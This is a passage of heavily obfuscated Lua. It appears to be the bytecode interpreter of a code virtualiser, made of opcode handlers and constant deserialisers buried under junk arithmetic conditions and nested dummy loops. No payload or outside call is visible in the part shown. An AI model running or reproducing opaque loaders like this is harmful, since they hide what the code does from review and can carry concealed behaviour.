end,__newindex=function(v632,v633,v634)local v649=0;local v650;local v651;local v652;while true do if (v649==1) then v652=nil;while true do if ((((3242 -2248) + 1638)==(9975 -7343)) and (v650==0)) then local v684=0;local v685;while true do if (v684==0) then v685=0;while true do if (v685==0) then local v725=0;while true do if (v725==0) then v651=1863 -(847 + 1016);v652=nil;v725=1;end if (1==v725) then v685=1;break;end end end if (v685==1) then v650=(83 + 24) -(92 + 14);break;end end break;end end end if ((v650==(1 -0)) or ((437 -((481 -(120 + 238)) + 65))>((401 -(42 + 160)) + 598))) then while true do if ((v651==(0 + 0)) or ((1311 + 3651)<1938)) then v652=v328[v633];v652[1][v652[2 + 0]]=v634;break;end end break;end end break;end if (v649==0) then v650=0 -0;v651=nil;v649=1;end end end});v582=1;end end end if (((3770 -((3730 -2933) + 398))>(2683 -(239 + 1244))) and (v491==1)) then v325=2 -0;break;end end break;end end end if ((4421>=(884 + 386)) and ((0 -(0 -0))==v325)) then local v492=0;local v493;while true do if (0==v492) then v493=623 -(601 + 22);while true do if ((v493==(1 -0)) or ((885 + 527)>(6241 -3463))) then v325=1 + 0;break;end if (((23521 -18814)==(8198 -3491)) and (v493==(1500 -(619 + 881)))) then local v583=0;local v584;while true do if (0==v583) then v584=0;while true do if (v584==0) then v326=v216[v223[5 -2]];v327=nil;v584=1;end if (v584==1) then v493=1 + 0;break;end end break;end end end end break;end end end end break;end if (((4486 -(74 + (113 -65)))>(7992 -(5830 -(97 + 123)))) and (v324==0)) then local v451=0;while true do if (v451==0) then local v494=0;while true do if (v494==0) then v325=0 -0;v326=nil;v494=1;end if (v494==1) then v451=1;break;end end end if (v451==1) then v324=1 + 0;break;end end end end break;end if (v323==0) then local v428=0;while true do if (v428==0) then local v452=0;while true do if (v452==0) then v324=(0 + 0) -0;v325=nil;v452=1;end if (v452==1) then v428=1;break;end end end if (v428==1) then v323=1;break;end end end if (v323==1) then local v429=0;local v430;while true do if (v429==0) then v430=0;while true do if (v430==1) then v323=2;break;end if (v430==0) then v326=nil;v327=nil;v430=1;end end break;end end end end elseif ((3257<=(3722 + (129 -(18 + 12)))) and (v224==(38 -10))) then local v383=0;local v384;local v385;local v386;local v387;while true do if (v383==1) then v386=nil;v387=nil;v383=2;end if (v383==0) then v384=0;v385=nil;v383=1;end if (2==v383) then while true do if (v384==0) then local v481=0;while true do if (v481==0) then v385=0;v386=nil;v481=1;end if (v481==1) then v384=1;break;end end end if (v384==1) then v387=nil;while true do if (v385==1) then while true do if ((v386==0) or ((7850 -(2065 + 3150))<(407 -181))) then v387=v223[2 -0];v221[v387]=v221[v387](v221[v387 + (975 -(155 + 819))]);break;end end break;end if (v385==0) then v386=1132 -(748 + 384);v387=nil;v385=1;end end break;end end break;end end else local v388=0;local v389;local v390;local v391;local v392;local v393;local v394;local v395;while true do if (v388==0) then v389=0;v390=nil;v388=1;end if (v388==2) then v393=nil;v394=nil;v388=3;end if (1==v388) then v391=nil;v392=nil;v388=2;end if (3==v388) then v395=nil;while true do if (v389==3) then while true do if ((v390==(1730 -(1145 + 585))) or ((1678 -591)<(46 + 560))) then local v528=0;local v529;local v530;while true do if (1==v528) then while true do if (v529==0) then v530=(0 + 0) -0;while true do if (((1730 -(207 + 35))<2407) and (v530==(1487 -(988 + 498)))) then v390=1 + 0;break;end if ((((1035 + 589) -(68 + 397))<=(930 + 793)) and (v530==(1782 -((2027 -(455 + 1256)) + 1466)))) then v391=809 -(175 + 416 + 218);v392=nil;v530=487 -(329 + 157);end end break;end end break;end if (v528==0) then v529=0;v530=nil;v528=1;end end end if ((v390==(1 + 0 + 0)) or ((355 + 774)==1637)) then local v531=0;local v532;while true do if (v531==0) then v532=105 -(10 + 95);while true do if (((531 -(521 + 10))==v532) or ((185 + 2468)>=(10548 -7538))) then local v606=0;local v607;local v608;while true do if (1==v606) then while true do if (v607==0) then v608=0;while true do if (v608==0) then local v686=0;local v687;while true do if (v686==0) then v687=0;while true do if (v687==1) then v608=1;break;end if (v687==0) then local v726=0;while true do if (v726==0) then v393=nil;v394=nil;v726=1;end if (v726==1) then v687=1;break;end end end end break;end end end if (1==v608) then v532=(555 + 493) -(822 + (450 -225));break;end end break;end end break;end if (v606==0) then v607=0;v608=nil;v606=1;end end end if (((2701 -1771)>847) and (v532==1)) then v390=6 -4;break;end end break;end end end if ((3464<=(5363 -(165 + 615))) and (v390==(846 -(649 + 195)))) then v395=nil;while true do if ((4327<=4602) and (v391==0)) then local v563=0;local v564;while true do if (v563==0) then v564=0 + 0;while true do if (((3201 -(306 + 505))==(3126 -(341 + 395))) and (v564==(1 + 0))) then v391=1;break;end if ((v564==0) or (2074==(2362 -(523 + 892)))) then local v653=0;local v654;local v655;while true do if (v653==1) then while true do if (v654==0) then v655=0 + 0;while true do if (((4062 -(941 + 212))<(10125 -6162)) and (v655==0)) then local v718=0;local v719;while true do if (0==v718) then v719=0;while true do if (v719==1) then v655=(1802 -(1228 + 573)) -0;break;end if (v719==0) then v392=v223[2 + (0 -0)];v393,v394=v218(v221[v392](v221[v392 + (617 -(349 + (592 -325)))]));v719=1;end end break;end end end if (((1732 + 171)<=((2477 -1495) + 1782)) and (v655==(2 -1))) then v564=1 + 0;break;end end break;end end break;end if (v653==0) then v654=0;v655=nil;v653=1;end end end end break;end end end if ((2997<=(9478 -4872)) and (v391==(558 -((705 -(187 + 31)) + 69)))) then for v585=v392,v162 do local v586=0;local v587;local v588;local v589;while true do if (v586==1) then v589=nil;while true do if (v587==1) then while true do if ((v588==(241 -(172 + 69))) or ((6000 -(1260 + 133))<3338)) then v589=0 + 0;while true do if (((0 -0)==v589) or ((1231 + 474)>(4850 -(1122 + 803)))) then v395=v395 + (1717 -(180 + 1536));v221[v585]=v393[v395];break;end end break;end end break;end if (v587==0) then local v662=0;while true do if (v662==1) then v587=1;break;end if (v662==0) then v588=0 -0;v589=nil;v662=1;end end end end break;end if (v586==0) then v587=0;v588=nil;v586=1;end end end break;end if ((v391==(1 -(0 + 0))) or (4132<((106 + 2908) -(260 + 1124)))) then local v565=0;local v566;local v567;local v568;while true do if (v565==0) then v566=0;v567=nil;v565=1;end if (v565==1) then v568=nil;while true do if (v566==0) then v567=450 -((1057 -(785 + 109)) + 287);v568=nil;v566=1;end if (v566==1) then while true do if (((2010 + 197 + 961)==(768 + 668 + 1732)) and (v567==(0 -0))) then v568=0;while true do if (((5 + 95 + 22)<(5256 -(1068 + 183))) and (v568==(0 + 0))) then local v688=0;while true do if (v688==0) then local v720=0;while true do if (v720==1) then v688=1;break;end if (v720==0) then v162=(v394 + v392) -(1 + 0 + 0);v395=0 + (0 -0);v720=1;end end end if (v688==1) then v568=(1 -0) + 0;break;end end end if ((v568==(1 + 0)) or (((3616 + 3900) -5782)==1277)) then v391=2 + 0;break;end end break;end end break;end end break;end end end end break;end end break;end if (v389==0) then local v482=0;while true do if (v482==0) then v390=0;v391=nil;v482=1;end if (v482==1) then v389=1;break;end end end if (v389==2) then v394=nil;v395=nil;v389=3;end if (v389==1) then local v483=0;while true do if (1==v483) then v389=2;break;end if (0==v483) then v392=nil;v393=nil;v483=1;end end end end break;end end end elseif ((v224<=30) or (1330>=(300 + 3900))) then local v329=0;local v330;local v331;local v332;local v333;while true do if (v329==1) then v332=nil;v333=nil;v329=2;end if (v329==0) then v330=0;v331=nil;v329=1;end if (v329==2) then while true do if (v330==0) then v331=0 -0;v332=nil;v330=1;end if (v330==1) then v333=nil;while true do if ((1470<=((2575 -1659) + (7951 -4809))) and (v331==(1880 -(1069 + 811)))) then local v495=0;local v496;local v497;while true do if (0==v495) then v496=0;v497=nil;v495=1;end if (v495==1) then while true do if (v496==0) then v497=0;while true do if (v497==0) then local v622=0;local v623;while true do if (v622==0) then v623=0;while true do if (v623==0) then v332=(0 + 0) -0;v333=nil;v623=1;end if (v623==1) then v497=1;break;end end break;end end end if (v497==1) then v331=1371 -(922 + 448);break;end end break;end end break;end end end if (((1402 -(2 + 379 + 290))==(400 + 331)) and (v331==(1 + 0))) then while true do if (((8171 -3631)>(2075 -(206 + 4))) and (v332==(1205 -(793 + 412)))) then v333=v223[(139 -(92 + 45)) + 0];v221[v333]=v221[v333]();break;end end break;end end break;end end break;end end elseif (((4332 -2906)==(489 + 937)) and (v224>((1183 -(453 + 726)) + 27))) then v221[v223[1 + 1]][v223[241 -(95 + 143)]]=v221[v223[4]];else v130[v223[3]]=v221[v223[2]];end elseif ((v224<=(13 + 25)) or ((169 + 37)==((8663 -3742) -((172 -(117 + 26)) + 22)))) then if ((v224<=(99 -64)) or (2095>(4330 -(34 + 29 + 47)))) then if (((10981 -8343)<(4214 -(1060 + 94))) and (v224<=((258 -146) -(222 -143)))) then if ((v223[366 -(63 + 301)]==v221[v223[7 -3]]) or (((5118 -(553 + 880)) -(43 + 119))==((18272 -(790 + 1096)) -11819))) then v161=v161 + (1374 -(467 + 906));else v161=v223[3 + 0];end elseif (((2706 -(649 + 1150))==907) and (v224==(383 -(160 + 189)))) then local v398=0;local v399;local v400;local v401;local v402;while true do if (v398==0) then v399=0;v400=nil;v398=1;end if (v398==1) then v401=nil;v402=nil;v398=2;end if (v398==2) then while true do if (v399==1) then v402=nil;while true do if (v400==1) then while true do if ((v401==((0 + 0) -0)) or ((731 + 345)==1327)) then v402=v223[2];v221[v402]=v221[v402](v15(v221,v402 + (2 -1),v162));break;end end break;end if (v400==0) then local v533=0;while true do if (v533==1) then v400=1;break;end if (v533==0) then local v570=0;while true do if (v570==1) then v533=1;break;end if (v570==0) then v401=0 + 0;v402=nil;v570=1;end end end end end end break;end if (v399==0) then v400=0;v401=nil;v399=1;end end break;end end elseif ((2758==(3768 -(12 + 998))) and v221[v223[616 -(244 + 370)]]) then v161=v161 + 1 + 0;else v161=v223[1838 -(196 + 1639)];end elseif (((3667 -((2887 -1771) + 216))<=(4002 -(21 + 152))) and (v224<=(1565 -(804 + (1740 -1015))))) then local v334=0;local v335;local v336;local v337;local v338;while true do if (((1863 -1300)==(1167 -604)) and (v334==(1 + 0))) then local v431=0;local v432;while true do if (v431==0) then v432=0;while true do if (v432==0) then v337=nil;v338=nil;v432=1;end if (v432==1) then v334=1328 -(202 + 1124);break;end end break;end end end if ((v334==((0 + 0) -0)) or ((3090 -1358)>(1279 + 1627))) then local v433=0;local v434;while true do if (v433==0) then v434=0;while true do if (0==v434) then local v498=0;while true do if (v498==1) then v434=1;break;end if (v498==0) then v335=0 + 0;v336=nil;v498=1;end end end if (1==v434) then v334=3 -2;break;end end break;end end end if ((754==(1677 -(1493 -570))) and (v334==2)) then while true do if (((6146 -(758 + 865))>(551 -(393 + 54))) and (v335==1)) then v338=155 -(16 + 139);for v457=v336,v223[4 + 0] do local v458=0;local v459;local v460;local v461;local v462;while true do if (2==v458) then while true do if (v459==0) then v460=0;v461=nil;v459=1;end if (v459==1) then v462=nil;while true do if (v460==0) then local v594=0;while true do if (1==v594) then v460=1;break;end if (v594==0) then v461=0 + 0;v462=nil;v594=1;end end end if (v460==1) then while true do if (((1367 + 1472)>=((4859 -(609 + 740)) -(219 + 1316))) and (v461==(0 -0))) then v462=0;while true do if ((1213<=(2684 -((2096 -(1344 + 595)) + 960))) and (v462==(0 -0))) then v338=v338 + 1;v221[v457]=v337[v338];break;end end break;end end break;end end break;end end break;end if (v458==0) then v459=0;v460=nil;v458=1;end if (1==v458) then v461=nil;v462=nil;v458=2;end end end break;end if (((5675 -2482)==(5153 -(175 + 1379 + 406))) and ((0 -0)==v335)) then local v453=0;local v454;while true do if (0==v453) then v454=1328 -(1226 + 102);while true do if (((3091 + 787)==(5174 -(839 + 457))) and (v454==0)) then local v545=0;while true do if (v545==1) then v454=1701 -(1317 + 383);break;end if (0==v545) then local v590=0;while true do if (v590==1) then v545=1;break;end if (v590==0) then v336=v223[(2 + 2) -2];v337={v221[v336](v221[v336 + 1])};v590=1;end end end end end if ((v454==1) or ((2193 -761)<(1706 -869))) then v335=1;break;end end break;end end end end break;end end elseif (((6221 -3693)==(9034 -6506)) and (v224==(117 -80))) then local v403=0;local v404;local v405;local v406;while true do if (v403==0) then v404=0;v405=nil;v403=1;end if (v403==1) then v406=nil;while true do if (v404==1) then while true do if ((v405==(0 + 0)) or ((6171 -(1563 + 89))<(722 -383))) then v406=v223[2];v221[v406](v15(v221,v406 + 1 + 0,v223[4 -1]));break;end end break;end if (v404==0) then local v484=0;while true do if (v484==0) then local v534=0;while true do if (v534==1) then v484=1;break;end if (v534==0) then v405=(1503 + 193) -(1048 + 648);v406=nil;v534=1;end end end if (v484==1) then v404=1;break;end end end end break;end end else v221[v223[254 -(118 + 134)]]=v129[v223[2 + 1]];end elseif (((375 + 389)>=(303 -169)) and (v224<=41)) then if ((v224<=(1879 -((1059 -(16 + 904)) + 1701))) or ((2277 + 2517)<(1758 + 487))) then v221[v223[246 -(179 + 65)]]=v221[v223[3 + 0]];elseif ((v224==(5 + 35)) or (1336>(9097 -5819))) then local v408=0;local v409;local v410;local v411;local v412;while true do if (v408==1) then v411=nil;v412=nil;v408=2;end if (v408==2) then while true do if (v409==0) then v410=0;v411=nil;v409=1;end if (v409==1) then v412=nil;while true do if (v410==1) then while true do if (((0 + 0 + 0)==v411) or ((712 + 904)==2845)) then v412=v223[7 -5];v221[v412](v221[v412 + 1 + 0]);break;end end break;end if (v410==0) then local v535=0;while true do if (v535==1) then v410=1;break;end if (v535==0) then local v571=0;while true do if (v571==1) then v535=1;break;end if (v571==0) then v411=1750 -(730 + 1020);v412=nil;v571=1;end end end end end end break;end end break;end if (v408==0) then v409=0;v410=nil;v408=1;end end else v221[v223[4 -2]]=v130[v223[3]];end elseif ((v224<=(191 -149)) or ((8138 -4057)<=(459 + 15))) then local v340=0;local v341;local v342;local v343;while true do if (v340==0) then v341=144 -(134 + 10);v342=nil;v340=1;end if (v340==1) then v343=nil;while true do if ((v341==(1254 -(554 + 700))) or (((3058 -(279 + 259)) -(718 + 841))==(1803 -408))) then local v455=0;while true do if (v455==0) then v342=(0 -0) -0;v343=nil;v455=1;end if (v455==1) then v341=1 + 0;break;end end end if ((v341==(3 -(2 + 0))) or ((392 + 1003 + 355)==(4756 -(299 + 21)))) then while true do if ((v342==((872 + 157) -(916 + 113))) or (623>(4213 -(2333 -1531)))) then v343=v223[2];v221[v343]=v221[v343](v15(v221,v343 + ((170 + 106) -(96 + 179)),v223[1057 -((622 -(298 + 130)) + 860)]));break;end end break;end end break;end end elseif (((4867 -(149 + 434))==(12519 -8235)) and (v224>(74 -31))) then local v414=0;local v415;local v416;local v417;local v418;local v419;local v420;while true do if (0==v414) then v415=0;v416=nil;v414=1;end if (1==v414) then v417=nil;v418=nil;v414=2;end if (v414==3) then while true do if (v415==1) then v418=nil;v419=nil;v415=2;end if (2==v415) then v420=nil;while true do if ((((5649 -(28 + 630)) -(2415 + 554))<=(3086 -(545 + 230))) and (v416==1)) then local v536=0;local v537;local v538;while true do if (v536==1) then while true do if (0==v537) then v538=0;while true do if (v538==0) then local v656=0;while true do if (v656==1) then v538=1;break;end if (v656==0) then local v675=0;while true do if (v675==1) then v656=1;break;end if (v675==0) then v419=nil;v420=nil;v675=1;end end end end end if (v538==1) then v416=1 + 1;break;end end break;end end break;end if (v536==0) then v537=0;v538=nil;v536=1;end end end if ((v416==(1701 -(861 + 838))) or ((7111 -4541)>(6766 -2302))) then while true do if ((v417==0) or ((1074 + 2776)<=(9232 -5386))) then local v572=0;local v573;local v574;while true do if (v572==1) then while true do if (v573==0) then v574=0;while true do if (v574==0) then v418=(1927 -(1605 + 322)) + 0;v419=nil;v574=1;end if (v574==1) then v417=2 -1;break;end end break;end end break;end if (v572==0) then v573=0;v574=nil;v572=1;end end end if (((1 + 0)==v417) or ((2152 -(868 + 604))==(4642 -(340 + 817)))) then v420=nil;while true do if ((v418==(1101 -(682 + 419))) or ((10844 -7700)<1873)) then local v609=0;local v610;local v611;local v612;while true do if (v609==1) then v612=nil;while true do if (v610==1) then while true do if (((5566 -3132)>(797 -338)) and (v611==0)) then v612=0;while true do if (((14756 -10169)>=(2756 -(890 + 156))) and (v612==(0 + 0))) then local v721=0;local v722;local v723;while true do if (0==v721) then v722=0;v723=nil;v721=1;end if (v721==1) then while true do if (0==v722) then v723=(2180 -(567 + 451)) -(497 + 665);while true do if ((v723==(495 -(249 + 245))) or ((5013 -(176 + 1184))<=2189)) then v612=1 -0;break;end if ((((511 -296) -131)<=(8794 -4907)) and ((1554 -(1280 + 274))==v723)) then v419=v223[2];v420={};v723=1 + 0;end end break;end end break;end end end if ((((14548 -11616) -(25 + 1057))>(240 + (762 -342))) and (v612==(2 -1))) then v418=2 -1;break;end end break;end end break;end if (0==v610) then v611=1880 -(1291 + 589);v612=nil;v610=1;end end break;end if (0==v609) then v610=0;v611=nil;v609=1;end end end if (((3993 -(794 + 7))<=4723) and (v418==1)) then for v624=1 + (0 -0), #v220 do local v625=0;local v626;local v627;local v628;while true do if (v625==1) then v628=nil;while true do if (v626==0) then local v677=0;while true do if (v677==1) then v626=1;break;end if (v677==0) then v627=0 + 0;v628=nil;v677=1;end end end if (v626==1) then while true do if ((4769>(4521 -(700 + 997))) and (v627==0)) then v628=v220[v624];for v698=0, #v628 do local v699=0;local v700;local v701;local v702;local v703;local v704;local v705;while true do if (v699==2) then v704=nil;v705=nil;v699=3;end if (v699==3) then while true do if (v700==2) then v705=nil;while true do if ((0==v701) or (1721==(2302 -(74 + 179)))) then local v737=1914 -(1753 + (754 -(282 + 311)));while true do if ((4388>=(5231 -3203)) and (v737==(0 -0))) then local v742=0;local v743;while true do if (v742==0) then v743=0;while true do if (v743==0) then v702=0 -0;v703=nil;v743=1;end if (1==v743) then v737=1 + (0 -0);break;end end break;end end end if ((v737==((686 -(370 + 315)) + 0 + 0)) or (516>(1529 -868))) then v701=1 + 0;break;end end end if ((v701==(207 -(102 + 104))) or ((3446 -1031)==(6968 -3542))) then local v738=0;local v739;while true do if (v738==0) then v739=0 + 0;while true do if ((v739==(1 + 0)) or (((4090 -(81 + 9)) + 985)<((14684 -10252) -(681 + (494 -349))))) then v701=2;break;end if (((4339 + 305)>=((5767 -1765) -2786)) and (v739==0)) then local v750=0;local v751;while true do if (v750==0) then v751=0;while true do if (v751==0) then v704=nil;v705=nil;v751=1;end if (v751==1) then v739=294 -(54 + 239);break;end end break;end end end end break;end end end if (((1538 -(43 + 170))==((6460 -3305) -(1191 + 639))) and (v701==2)) then while true do if ((((1013 -(551 + 239)) -(66 + 157))==v702) or ((12 + 71)>2298)) then local v744=0;local v745;local v746;local v747;while true do if (v744==0) then v745=0;v746=nil;v744=1;end if (v744==1) then v747=nil;while true do if (1==v745) then while true do if (((1649 -(762 + 887))==v746) or ((3441 + (2165 -(1007 + 538)))==(2136 -(12 + 27 + 815)))) then v747=0;while true do if (((1419 -(67 + 63))<=(3813 + 1047)) and (v747==(3 -2))) then v702=1;break;end if ((v747==(90 -((1088 -(108 + 964)) + 74))) or (((10199 -(1175 + 126)) -4309)<3281)) then local v755=0;while true do if (v755==1) then v747=1464 -((1204 -(520 + 334)) + 1113);break;end if (v755==0) then local v756=0;while true do if (v756==0) then v703=v628[v698];v704=v703[2 -1];v756=1;end if (1==v756) then v755=1;break;end end end end end end break;end end break;end if (v745==0) then local v752=0;while true do if (v752==0) then v746=1984 -(75 + 1909);v747=nil;v752=1;end if (v752==1) then v745=1;break;end end end end break;end end end if ((v702==(2 -1)) or ((2930 -1703)>=(1982 -(223 + 486)))) then v705=v703[2];if (((3775 -(176 + 22))>=2888) and (v704==v221) and (v705>=v419)) then local v748=0;local v749;while true do if (v748==0) then v749=0 -0;while true do if (((4257 -(1172 + 480))==((12518 -9154) -(416 + 343))) and (((2229 -(1050 + 461)) -(707 + 7 + 4))==v749)) then v420[v705]=v704[v705];v703[2 -1]=v420;break;end end break;end end end break;end end break;end end break;end if (v700==1) then local v729=0;while true do if (v729==0) then v703=nil;v704=nil;v729=1;end if (v729==1) then v700=2;break;end end end if (v700==0) then v701=996 -(344 + 361 + 291);v702=nil;v700=1;end end break;end if (v699==0) then v700=0;v701=nil;v699=1;end if (1==v699) then v702=nil;v703=nil;v699=2;end end end break;end end break;end end break;end if (v625==0) then local v663=0;while true do if (0==v663) then v626=0;v627=nil;v663=1;end if (v663==1) then v625=1;break;end end end end end break;end end break;end end break;end if ((v416==0) or ((4817 -(732 + 156))<((3826 -(224 + 125)) -(700 + 1056)))) then local v539=0;local v540;while true do if (v539==0) then v540=0;while true do if (1==v540) then v416=2 -1;break;end if (v540==0) then local v613=0;local v614;while true do if (v613==0) then v614=0;while true do if (v614==1) then v540=1;break;end if (v614==0) then v417=0 + 0 + 0;v418=nil;v614=1;end end break;end end end end break;end end end end break;end if (v415==0) then v416=0 + 0;v417=nil;v415=1;end end break;end if (v414==2) then v419=nil;v420=nil;v414=3;end end else v221[v223[397 -(67 + 328)]]=v37(v216[v223[2 + 1]],nil,v130);end v161=v161 + (1769 -(1152 + 616));break;end if (((96 + 130)<=3689) and ((0 -0)==v254)) then local v271=0;local v272;while true do if (v271==0) then v272=0;while true do if (v272==0) then local v282=0;while true do if (1==v282) then v272=1;break;end if (v282==0) then local v294=0;while true do if (v294==0) then v223=v214[v161];v224=v223[(795 -(270 + 523)) -1];v294=1;end if (v294==1) then v282=1;break;end end end end end if (v272==1) then v254=4 -3;break;end end break;end end end end break;end end break;end end end break;end if (v213==2) then v220={};v221={};for v255=0 + 0,v164 do if ((4511>=(2028 -(467 + 145))) and (v255>=v217)) then v219[v255-v217]=v163[v255 + (3 -2)];else v221[v255]=v163[v255 + 1];end end v213=3;end if (v213==0) then local v248=0;while true do if (v248==1) then v216=v140;v213=1;break;end if (v248==0) then v214=v139;v215=Const;v248=1;end end end end break;end if (v212==2) then v221=nil;v222=nil;v223=nil;v224=nil;v212=3;end end end v200=1;end end end if (v160==1) then local v201=0;while true do if (v201==0) then v163={...};v164=v14("#",...) -1;v201=1;end if (v201==1) then v160=2;break;end end end if (v160==0) then v161=1;v162= -1;v160=1;end if (v160==3) then A,B=v35(v13(v165));if  not A[1] then local v205=0;local v206;local v207;local v208;while true do if (v205==1) then v208=nil;while true do if (0==v206) then v207=0;v208=nil;v206=1;end if (v206==1) then while true do if (v207==0) then v208=v128[4][v161] or "?";error("Script error at ["   .. v208   .. "]:"   .. A[2]);break;end end break;end end break;end if (v205==0) then v206=0;v207=nil;v205=1;end end else return v15(A,2,B);end break;end end break;end if (v159==0) then local v192=0;while true do if (v192==1) then v159=1;break;end if (v192==0) then local v202=0;while true do if (1==v202) then v192=1;break;end if (v202==0) then v160=0;v161=nil;v202=1;end end end end end if (v159==2) then local v193=0;while true do if (v193==0) then v164=nil;v165=nil;v193=1;end if (v193==1) then v159=3;break;end end end end break;end if (v158==0) then local v176=0;while true do if (v176==1) then v158=1;break;end if (v176==0) then v159=0;v160=nil;v176=1;end end end if (1==v158) then v161=nil;v162=nil;v158=2;end if (2==v158) then local v177=0;while true do if (0==v177) then v163=nil;v164=nil;v177=1;end if (v177==1) then v158=3;break;end end end end end;end if (0==v138) then v139=v128[1];v140=v128[2];v138=1;end end end v104=1;end if (v104==1) then v87=1;break;end end end if (v87==1) then v48=1;break;end end end if (1==v48) then return v37(v36(),{},v23)();end break;end end end break;end end end if (v25==3) then local v49=0;local v50;while true do if (v49==0) then v50=0;while true do if (v50==1) then function v33(v70)local v71=0;local v72;local v73;local v74;while true do if (v71==0) then v72=0;v73=nil;v71=1;end if (v71==1) then v74=nil;while true do local v105=0;local v106;while true do if (v105==0) then v106=0;while true do if (v106==1) then if (v72==0) then local v150=0;while true do if (v150==1) then v72=1;break;end if (v150==0) then v73=nil;if  not v70 then local v178=0;while true do if (v178==0) then v70=v31();if (v70==(0 + 0)) then return "";end break;end end end v150=1;end end end if (v72==3) then return v9(v74);end break;end if (v106==0) then local v146=0;while true do if (v146==1) then v106=1;break;end if (v146==0) then if (v72==1) then local v170=0;while true do if (1==v170) then v72=2;break;end if (v170==0) then local v180=0;while true do if (0==v180) then v73=v6(v22,v26,(v26 + v70) -1);v26=v26 + v70;v180=1;end if (v180==1) then v170=1;break;end end end end end if (v72==2) then local v171=0;while true do if (v171==1) then v72=3;break;end if (v171==0) then v74={};for v182=1937 -(1852 + 84), #v73 do v74[v182]=v5(v4(v6(v73,v182,v182)));end v171=1;end end end v146=1;end end end end break;end end end break;end end end v34=v31;v50=2;end if (v50==2) then v25=4;break;end if (v50==0) then function v32()local v75=0;local v76;local v77;local v78;local v79;while true do if (v75==1) then v78=nil;v79=nil;v75=2;end if (v75==2) then while true do if (v76==0) then v77=91 -(1 + 47 + 23 + 20);v78=nil;v76=1;end if (v76==1) then v79=nil;while true do local v124=0;local v125;while true do if (v124==0) then v125=0;while true do if (v125==0) then if (v77==(726 -(113 + 613))) then local v172=0;local v173;local v174;while true do if (v172==0) then v173=0;v174=nil;v172=1;end if (v172==1) then while true do if (0==v173) then v174=0;while true do if (1==v174) then v77=1977 -(1096 + 880);break;end if (v174==0) then local v203=0;local v204;while true do if (v203==0) then v204=0;while true do if (v204==0) then local v232=0;while true do if (1==v232) then v204=1;break;end if (0==v232) then v78=v31();v79=v31();v232=1;end end end if (v204==1) then v174=1;break;end end break;end end end end break;end end break;end end end if (v77==(770 -(338 + 431))) then return (( -(1 + 1) * v28(v79,21 + 11)) + (1015 -(388 + 626)) + 0) * ((1 + 1)^(v28(v79,1959 -(79 + 1859),20 + 11) -1023)) * ((((v28(v79,1 -0,61 -41) * ((1803 -((5037 -3412) + 176))^(865 -(615 + 218)))) + v78)/((5 -3)^(128 -76))) + (3 -2));end break;end end break;end end end break;end end break;end if (v75==0) then local v90=0;while true do if (v90==1) then v75=1;break;end if (v90==0) then v76=0;v77=nil;v90=1;end end end end end v33=nil;v50=1;end end break;end end end break;end if (v44==0) then local v45=0;while true do if (v45==1) then v44=1;break;end if (v45==0) then if (v25==4) then local v54=0;while true do if (v54==0) then local v63=0;while true do if (v63==1) then v54=1;break;end if (0==v63) then v35=nil;function v35(...)return {...},v14("#",...);end v63=1;end end end if (v54==2) then v25=5;break;end if (1==v54) then local v64=0;while true do if (v64==1) then v54=2;break;end if (v64==0) then v36=nil;function v36()local v91=0;local v92;local v93;local v94;local v95;local v96;local v97;local v98;local v99;while true do if (v91==1) then v94=nil;v95=nil;v91=2;end if (v91==3) then v98=nil;v99=nil;v91=4;end if (v91==2) then v96=nil;v97=nil;v91=3;end if (v91==4) then while true do if (v92==2) then local v142=0;local v143;while true do if (v142==0) then v143=0;while true do if (v143==1) then v92=3;break;end if (v143==0) then local v175=0;while true do if (v175==1) then v143=1;break;end if (v175==0) then v97=nil;v98=nil;v175=1;end end end end break;end end end if (v92==3) then v99=nil;while true do local v147=0;local v148;local v149;while true do if (v147==1) then while true do if (v148~=(0 -0)) then else v149=0;while true do if (v149~=0) then else local v184=0;local v185;local v186;while true do if (0==v184) then v185=0;v186=nil;v184=1;end if (v184==1) then while true do if (v185==0) then v186=0;while true do if (v186==0) then if (v93==3) then local v233=0;local v234;local v235;while true do if (v233==1) then while true do if (v234==0) then v235=0 -0;while true do local v258=0;local v259;while true do if (v258==0) then v259=0;while true do if (v259==0) then if (v235==0) then local v273=0;local v274;while true do if (0==v273) then v274=0;while true do if (v274==1) then v235=2 -1;break;end if (v274==0) then local v283=0;local v284;while true do if (v283==0) then v284=0;while true do if (v284==1) then v274=1;break;end if (v284==0) then local v435=0;while true do if (v435==1) then v284=1;break;end if (0==v435) then for v463=1897 -(1025 + 871),v31() do v95[v463-(1 + 0)]=v36();end for v465=183 -(150 + 32),v31() do v96[v465]=v31();end v435=1;end end end end break;end end end end break;end end end if ((1 + 0)==v235) then return v97;end break;end end break;end end end break;end end break;end if (v233==0) then v234=0;v235=nil;v233=1;end end end if (v93==(515 -(505 + 10))) then local v236=0;local v237;local v238;while true do if (v236==1) then while true do if (v237==0) then v238=0 + 0;while true do if (v238==1) then v96={};v93=1 + 0;break;end if (v238~=(0 + 0)) then else local v263=0;while true do if (1==v263) then v238=405 -(222 + 182);break;end if (v263==0) then v94={};v95={};v263=1;end end end end break;end end break;end if (v236==0) then v237=0;v238=nil;v236=1;end end end v186=1;end if (v186==1) then v149=292 -(227 + 64);break;end end break;end end break;end end end if (v149==1) then if (v93==(115 -(98 + 15))) then local v196=0;local v197;while true do if (v196==0) then v197=529 -(284 + 245);while true do if (v197~=0) then else local v211=0;while true do if (v211==0) then for v240=1 + 0,v98 do local v241=0;local v242;local v243;local v244;local v245;local v246;while true do if (v241==2) then v246=nil;while true do if (v242==0) then v243=0;v244=nil;v242=1;end if (v242==1) then v245=nil;v246=nil;v242=2;end if (v242==2) then while true do if (v243==1) then v246=nil;while true do if (v244==(1 + 0)) then if (v245==1) then v246=v29()~=(323 -(191 + 132));elseif (v245==2) then v246=v32();elseif (v245==(3 + 0)) then v246=v33();end v99[v240]=v246;break;end if (v244==(0 -0)) then local v268=330 -(287 + 43);local v269;while true do if (v268==(947 -(944 + 3))) then v269=1623 -(1320 + 303);while true do if (v269==1) then v244=1489 -(1294 + 194);break;end if (v269==0) then local v280=0;local v281;while true do if (0==v280) then v281=0 + 0;while true do if (v281==(843 -(750 + 93))) then local v344=0;local v345;while true do if (v344==0) then v345=0;while true do if (1==v345) then v281=902 -(705 + 196);break;end if (0==v345) then local v467=0;local v468;while true do if (v467==0) then v468=0;while true do if (v468==1) then v345=1;break;end if (v468==0) then v245=v29();v246=nil;v468=1;end end break;end end end end break;end end end if (v281~=(2 -1)) then else v269=1 + 0;break;end end break;end end end end break;end end end end break;end if (v243==0) then local v264=0;while true do if (v264==0) then local v270=0;while true do if (v270==0) then v244=0 + 0;v245=nil;v270=1;end if (v270==1) then v264=1;break;end end end if (v264==1) then v243=1;break;end end end end break;end end break;end if 